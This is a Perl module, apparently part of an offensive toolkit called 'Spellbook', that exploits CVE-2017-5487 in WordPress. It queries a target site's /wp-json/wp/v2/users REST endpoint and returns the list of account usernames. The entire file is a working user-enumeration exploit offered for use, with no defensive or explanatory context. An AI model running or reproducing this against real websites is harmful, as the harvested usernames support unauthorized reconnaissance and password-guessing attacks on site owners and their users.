package Spellbook::Exploits::CVE_2017_5487 {
    use JSON;
    use strict;
    use warnings;
    use Try::Tiny;
    use LWP::UserAgent;

    sub new {
        my ($self, $target)= @_;

        if ($target) {
            my $target    = $target . "/wp-json/wp/v2/users";
            my $userAgent = LWP::UserAgent -> new();
            my $request   = $userAgent -> get($target);
            my @result    = ();

            try {
                my $content = decode_json ($request -> content);
                
                foreach my $data (@$content) {
                    my $username = $data -> {slug};
                    push @result, $username, "\n";
                }
            }
            
            catch {
                push @result, "\n";
            };

            return @result;
        }   
    }
}

1;